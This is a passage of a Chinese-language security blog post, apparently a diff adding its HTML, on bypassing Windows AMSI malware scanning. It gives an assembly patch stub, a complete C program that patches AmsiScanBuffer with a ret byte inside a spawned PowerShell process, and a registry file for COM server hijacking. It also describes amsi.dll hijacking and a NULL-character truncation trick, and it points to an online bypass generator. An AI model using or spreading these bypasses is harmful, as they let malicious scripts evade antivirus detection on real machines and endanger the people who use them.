+<p>我们修改了被打补丁的函数为AmsiOpenSession,补丁汇编代码为:</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,-<span class="hljs-number">1</span><br><span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure>
+
+<p>我们知道了补丁函数可以为AmsiOpenSession、AmsiScanBuffer，补丁代码可以变化很<br>多，只要返回结果为负数就行。</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#<span class="hljs-keyword">include</span> &lt;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Windows</span>.</span></span>h&gt;<br>#<span class="hljs-keyword">include</span> &lt;stdio.h&gt;<br><br><span class="hljs-built_in">int</span> main<span class="hljs-literal">()</span> &#123;<br>    STARTUPINFOA si = &#123; <span class="hljs-number">0</span> &#125;;<br>    PROCESS_INFORMATION pi = &#123; <span class="hljs-number">0</span> &#125;;<br>    si.cb = sizeof(si);<br><br>    <span class="hljs-constructor">CreateProcessA(NULL, (LPSTR)</span><span class="hljs-string">&quot;powershell -NoExit dir&quot;</span>, NULL, NULL, NULL, NULL, NULL, NULL, &amp;si, &amp;pi);<br><br>    HMODULE hAmsi = <span class="hljs-constructor">LoadLibraryA(<span class="hljs-string">&quot;amsi.dll&quot;</span>)</span>;<br>    LPVOID pAmsiScanBuffer = <span class="hljs-constructor">GetProcAddress(<span class="hljs-params">hAmsi</span>, <span class="hljs-string">&quot;AmsiScanBuffer&quot;</span>)</span>;<br><br>    <span class="hljs-constructor">Sleep(500)</span>;<br><br>    DWORD oldProtect;<br>    <span class="hljs-built_in">char</span> patch = <span class="hljs-number">0xc3</span>;<br><br>    <span class="hljs-constructor">VirtualProtectEx(<span class="hljs-params">pi</span>.<span class="hljs-params">hProcess</span>, (LPVOID)</span>pAmsiScanBuffer, <span class="hljs-number">1</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);<br>    <span class="hljs-constructor">WriteProcessMemory(<span class="hljs-params">pi</span>.<span class="hljs-params">hProcess</span>, (LPVOID)</span>pAmsiScanBuffer, &amp;patch, sizeof(<span class="hljs-built_in">char</span>), NULL);<br>    <span class="hljs-constructor">VirtualProtectEx(<span class="hljs-params">pi</span>.<span class="hljs-params">hProcess</span>, (LPVOID)</span>pAmsiScanBuffer, <span class="hljs-number">1</span>, oldProtect, NULL);<br>    <span class="hljs-constructor">CloseHandle(<span class="hljs-params">pi</span>.<span class="hljs-params">hProcess</span>)</span>;<br>    <span class="hljs-constructor">CloseHandle(<span class="hljs-params">pi</span>.<span class="hljs-params">hThread</span>)</span>;<br>    <span class="hljs-constructor">FreeLibrary(<span class="hljs-params">hAmsi</span>)</span>;<br>    return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>0xc3的硬编码对应的汇编是ret，也就是调用AmsiScanBuffer直接让他返回。这个马是直接被杀的。</p>
+<h2 id="非主流对抗"><a href="#非主流对抗" class="headerlink" title="非主流对抗"></a>非主流对抗</h2><h3 id="1-劫持amsi-dll"><a href="#1-劫持amsi-dll" class="headerlink" title="1.劫持amsi.dll"></a>1.劫持amsi.dll</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>由于研发人员使用 LoadLibrary函数导入dll的时候没有使用绝对路径，因此程序会首先在当前目录下寻找dll</p>
+<p>因此我们在 powershell.exe同目录下放一个amsi.dll做劫持</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">amsi.dll<span class="hljs-string">`的默认目录：`</span>c:<span class="hljs-regexp">/windows/</span>system32/amsi.dll<br></code></pre></td></tr></table></figure>
+
+<p>还要考虑<code>amsi.dll</code>的导出函数，使用 Aheadlib工具生成或者自己找到 amsi.dll 对应的导出函数，自己写，一样的。当然自己的dll没有签名，这里还涉及到免杀的问题，如果可以添加微软前面，再劫持，又有很大的可玩性。</p>
+<h3 id="2-NULL字符绕过"><a href="#2-NULL字符绕过" class="headerlink" title="2.NULL字符绕过"></a>2.NULL字符绕过</h3><p>这个方法已经失效了，但还是提一下，扩充下思路。</p>
+<p>Amsi扫描使用的是 <code>AmsiScanString</code>函数</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sqf">HRESULT WINAPI AmsiScanString(<br><span class="hljs-variable">_In_</span> HAMSICONTEXT amsiContext,<br><span class="hljs-variable">_In_LPCWSTR</span> string, <span class="hljs-comment">// Will be terminated at the first null</span><br>character<br><span class="hljs-variable">_In_LPCWSTR</span> contentName,<br><span class="hljs-variable">_In_opt_HAMSISESSION</span> session,<br><span class="hljs-variable">_Out_AMSI_RESULT</span> *result<br>);<br></code></pre></td></tr></table></figure>
+
+<p>其中string就是脚本内容，在执行脚本之前加个空字符就可以截断，而修复的方法是用了 <code>AmsiScanBuffer</code>这个函数，所以amsi才会用这两个函数来扫描</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sqf">HRESULT WINAPI AmsiScanBuffer(<br><span class="hljs-variable">_In_</span>	HAMSICONTEXT amsiContext,<br><span class="hljs-variable">_In_</span>	PVOID buffer, <span class="hljs-comment">// Not terminated at the null character</span><br><span class="hljs-variable">_In_</span> 	ULONG length,<br><span class="hljs-variable">_In_</span>	LPCWSTR contentName,<br><span class="hljs-variable">_In_</span> 	opt_HAMSISESSION session,<br><span class="hljs-variable">_Out_</span> 	AMSI_RESULT *result<br>);<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-COM-server劫持"><a href="#3-COM-server劫持" class="headerlink" title="3.COM server劫持"></a>3.COM server劫持</h3><p>原理：amsi.dll在老版本中使用 CoCreateInstance()函数调用IID和CLSID来实例化COM接口。而这个函数会先<br>从注册表HKCU中找对应的dll去解析，也就是当前用户，因此我们创建相应的注册表，让它调用失败就行了。简单来说利用的是注册表优先级来绕过。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">Windows Registry Editor Version <span class="hljs-number">5.00</span><br>[HKEY_CURRENT_USER<span class="hljs-regexp">/Software/</span>Classes<span class="hljs-regexp">/CLSID/</span>&#123;fdb00e52-a214-<span class="hljs-number">4</span>aa1-<span class="hljs-number">8</span>fba-<br><span class="hljs-number">4357</span>bb0072ec&#125;]<br><br>[HKEY_CURRENT_USER<span class="hljs-regexp">/Software/</span>Classes<span class="hljs-regexp">/CLSID/</span>&#123;fdb00e52-a214-<span class="hljs-number">4</span>aa1-<span class="hljs-number">8</span>fba-<span class="hljs-number">4357</span>bb0072ec&#125;/InProcServer32]<br>@=<span class="hljs-string">&quot;C://goawayamsi.dll&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>而微软通过直接调用amsi.dll 的 <code>DllGetClassObject()</code> 函数替换 <code>CoCreateInstance()</code>，<br>可以避免注册表解析。</p>
+<p>但是这种方法也失效了，不过可以学习下思路。</p>
+<h2 id="最后"><a href="#最后" class="headerlink" title="## 最后"></a>## 最后</h2><p>AMSI 也还是有更多的方向可以研究，混淆等等 但更了解powershell 对于bypass有更好的帮助 还一个平台可参考用用<a target="_blank" rel="noopener" href="https://amsi.fail/">https://amsi.fail/</a></p>
+<p>在线生成的平台</p>
+<p> <img src="/2022/03/26/bypass-AMSI/image-20220326115012141.png" srcset="/img/loading.gif" lazyload alt="image-20220326115012141"></p>
+<p>参考:</p>
+<blockquote>
+<p>《Bypass AMSI的前世今生》by L.N.</p>
+</blockquote>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E7%BB%95%E8%BF%87/">绕过</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/AMSI/">AMSI</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">持久性-WMI事件订阅</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/">
+                        <span class="hidden-mobile">bypassUAC总结</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
